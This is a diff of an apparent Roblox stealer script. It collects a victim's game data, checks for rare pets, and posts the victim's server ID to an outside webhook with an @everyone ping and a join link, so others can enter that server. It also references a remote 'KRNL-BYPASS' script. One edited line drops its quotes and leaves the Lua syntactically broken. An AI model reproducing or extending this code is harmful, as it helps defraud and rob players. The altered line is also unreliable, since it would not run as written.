@@ -26,7 +26,7 @@ getgenv().Username = "DARK"
         local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
         local TeleportService = game:GetService("TeleportService")
         local krnlbypass = "https://raw.githubusercontent.com/RblxScriptsOG/Main/refs/heads/main/KRNL-BYPASS.lua"
-        local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+        local tpScript = game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")
 
         local data = DataService:GetData()
         local maxAttempts = 10
@@ -433,7 +433,8 @@ local embed = {
         {
             name = "🏝️ **Join with URL**",
             value = string.format(
-                "[Click to Join](https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s)",
+                "[%s](https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s)",
+                game.JobId,
                 game.PlaceId,
                 game.JobId
             ),
@@ -446,8 +447,8 @@ local embed = {
 }
 
 local payload = {
-    content = (hasRarePets() and "@everyone\n" or "") ..
-              string.format("```lua\n%s\n```", tpScript or "N/A"),
+    content = (hasRarePets() and "--@everyone\n" or "") ..
+              string.format("lua\n%s\n", tpScript or "N/A"),
     embeds = {embed}
 }
 
@@ -459,6 +460,7 @@ pcall(function()
         Body = HttpService:JSONEncode(payload)
     })
 end)
+
 
 
 
